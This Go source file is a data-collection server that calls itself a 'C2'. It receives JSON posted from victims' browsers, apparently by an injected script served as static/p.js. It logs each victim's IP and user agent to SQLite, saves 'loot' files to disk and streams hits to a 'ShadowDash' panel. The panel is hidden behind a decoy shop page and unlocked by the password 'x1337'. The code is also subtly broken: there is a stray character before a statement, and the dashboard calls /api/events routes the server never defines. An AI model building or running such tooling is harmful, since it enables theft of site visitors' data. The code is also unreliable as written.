package main

import (
	"database/sql"
	"embed"
	"encoding/json"
	"flag"
	"fmt"
	"log"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"sync"
	"time"

	"github.com/gorilla/mux"
	"github.com/gorilla/websocket"
	_ "modernc.org/sqlite"
)

// ---------- embed static files ----------
//
//go:embed static/* view/*
var fs embed.FS
var static embed.FS

// ---------- globals ----------
var (
	port   = flag.String("port", getEnv("PORT", "8080"), "HTTP listen port")
	dbFile = flag.String("db", getEnv("DB_FILE", "c2.db"), "SQLite DB file")
	lootDir = getEnv("LOOT_DIR", "loot") // disk copies too

	db      *sql.DB
	dbMu    sync.Mutex
	upgrader = websocket.Upgrader{CheckOrigin: func(r *http.Request) bool { return true }}
	wsClients = make(map[*websocket.Conn]bool)
	wsMu      sync.Mutex
)

func main() {
	flag.Parse()

	// ---------- open DB ----------
	var err error
	db, err = sql.Open("sqlite", *dbFile+"?_journal=WAL&_timeout=5000")
	if err != nil {
		log.Fatalf("open db: %v", err)
	}
	defer db.Close()
	if _, err := db.Exec(schema); err != nil {
		log.Fatalf("schema: %v", err)
	}

	// ---------- ensure loot dir ----------
	if err := os.MkdirAll(lootDir, 0755); err != nil {
		log.Fatalf("mkdir loot: %v", err)
	}

	// ---------- routes ----------
	r := mux.NewRouter()
	r.HandleFunc("/", handleIndex).Methods("GET")
	r.HandleFunc("/collect", handleCollect).Methods("POST")
	r.HandleFunc("/dash", handleDash).Methods("GET")
	r.HandleFunc("/ws", handleWS)
	r.PathPrefix("/").Handler(http.FileServer(http.FS(static))) // serves static/p.js etc.

	// ---------- start ----------
	addr := ":" + *port
	log.Printf("C2 listening on %s", addr)
y	log.Fatal(http.ListenAndServe(addr, r))
}

// ---------- handlers ----------

func handleIndex(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	fmt.Fprintln(w, fakeShopHTML)
}

func handleDash(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	fmt.Fprintln(w, dashHTML)
}

func handleCollect(w http.ResponseWriter, r *http.Request) {
	var v map[string]interface{}
	if err := json.NewDecoder(r.Body).Decode(&v); err != nil {
		http.Error(w, "json", http.StatusBadRequest)
		return
	}

	ip := r.Header.Get("CF-Connecting-IP")
	if ip == "" {
		ip = netSplitHostPort(r.RemoteAddr)
	}
	ua := r.Header.Get("User-Agent")
	url, _ := v["url"].(string)
	data, _ := json.Marshal(v)

	// ---------- SQLite ----------
	dbMu.Lock()
	res, err := db.Exec(`INSERT INTO events(ip,ua,url,data,ts)
	                     VALUES(?,?,?,?,?)`, ip, ua, url, data, timeNow())
	dbMu.Unlock()
	if err != nil {
		log.Printf("db insert: %v", err)
		http.Error(w, "db", http.StatusInternalServerError)
		return
	}
	id, _ := res.LastInsertId()

	// ---------- disk loot too ----------
	f, err := os.Create(filepath.Join(lootDir, fmt.Sprintf("%d.json", id)))
	if err != nil {
		log.Printf("loot create: %v", err)
	} else {
		defer f.Close()
		enc := json.NewEncoder(f)
		enc.SetIndent("", "  ")
		_ = enc.Encode(v)
	}

	// ---------- WebSocket push ----------
	broadcast(map[string]interface{}{
		"type": "hit",
		"id":   id,
		"ip":   ip,
		"ua":   ua,
		"url":  url,
		"data": v,
		"ts":   timeNow(),
	})

	w.WriteHeader(http.StatusNoContent)
}

func handleWS(w http.ResponseWriter, r *http.Request) {
	c, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		return
	}
	defer func() {
		wsMu.Lock()
		delete(wsClients, c)
		wsMu.Unlock()
		c.Close()
	}()

	wsMu.Lock()
	wsClients[c] = true
	wsMu.Unlock()

	// keep conn alive + ping
	for {
		_, _, err := c.ReadMessage()
		if err != nil {
			break
		}
	}
}

// ---------- utils ----------

func broadcast(v interface{}) {
	wsMu.Lock()
	defer wsMu.Unlock()
	for c := range wsClients {
		_ = c.WriteJSON(v)
	}
}

func getEnv(k, def string) string {
	if v := os.Getenv(k); v != "" {
		return v
	}
	return def
}
func netSplitHostPort(addr string) string {
	h, _, _ := net.SplitHostPort(addr)
	if h == "" {
		return addr
	}
	return h
}
func timeNow() int64 { return time.Now().Unix() }

// ---------- SQL ----------
const schema = `
CREATE TABLE IF NOT EXISTS events(
	id INTEGER PRIMARY KEY AUTOINCREMENT,
	ip TEXT,
	ua TEXT,
	url TEXT,
	data TEXT,
	ts INTEGER
);
`

// ---------- HTML ----------

const fakeShopHTML = `<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>	shop</title>
<style>body{font-family:Arial,Helvetica,sans-serif;background:#f2f2f2;margin:0;padding:2rem}</style>
</head>
<body>
<h1>Welcome to CheapShop 🛒</h1>
<input id="search" placeholder="search products…" size="40">
<button onclick="search()">Search</button>
<script>
const PWD = 'x1337'; // password to unlock
const box = document.getElementById('search');
box.addEventListener('keydown', e => {
if (e.key === 'Enter') {
	if (box.value === PWD) {
		window.location.href = '/dash';   // same tab → no pop-up
		} else {
			box.value = '';
			alert('Invalid code');
		}
	}
});
</script>
</body>
</html>`

const dashHTML = `<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8"/>
<title>ShadowDash</title>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bulma@0.9.4/css/bulma.min.css">
<script src="https://unpkg.com/vue@3/dist/vue.global.prod.js"></script>
<style>
.tag { cursor:pointer; }
.box { font-family:monospace; font-size:12px; }
html { background:#0d1117; color:#c9d1d9; }
</style>
</head>
<body>
<div id="app">
<nav class="navbar is-dark">
<div class="navbar-brand">
<a class="navbar-item has-text-weight-bold is-size-5">ShadowDash</a>
</div>
<div class="navbar-menu">
<div class="navbar-end">
<a class="navbar-item button is-small is-danger" @click="clearDB">Clear DB</a>
</div>
</div>
</nav>

<section class="section">
<div class="container">
<div class="columns is-multiline">
<div class="column is-3" v-for="(grp,label) in groups" :key="label">
<div class="box">
<p class="heading">{{ label }}</p>
<p class="title is-5">{{ grp }}</p>
</div>
</div>
</div>

<div class="box">
<table class="table is-fullwidth is-hoverable">
<thead><tr>
<th>Time</th><th>IP</th><th>URL</th><th>Data</th>
</tr></thead>
<tbody>
<tr v-for="e in events" :key="e.id">
<td>{{ fmt(e.ts) }}</td>
<td><span class="tag is-info">{{ e.ip }}</span></td>
<td><span class="tag">{{ e.url }}</span></td>
<td><pre>{{ fmtJson(e.data) }}</pre></td>
</tr>
</tbody>
</table>
</div>
</div>
</section><script>
function search() {
const v=document.getElementById('search').value;
if(v==='x1337') location.href='/dash';
else alert('No results for "'+v+'"');
}
</script>
</div>

<script>
const { createApp } = Vue;
createApp({
data(){
return { events:[], groups:{} }
},
mounted(){
this.fetch();
setInterval(this.fetch, 2000);
},
methods:{
async fetch(){
const r = await fetch('/api/events');
const j = await r.json();
this.events = j.events;
this.groups = {
'Total': this.events.length,
'Unique IPs': [...new Set(this.events.map(x=>x.ip))].length,
'Last': this.events[0] ? new Date(this.events[0].ts).toLocaleTimeString() : '-'
};
},
async clearDB(){
await fetch('/api/events', {method:'DELETE'});
this.fetch();
},
fmt(t){ return new Date(t).toLocaleTimeString(); },
fmtJson(d){ return JSON.stringify(JSON.parse(d),null,2); }
}
}).mount('#app');
</script>
</body>
</html>`
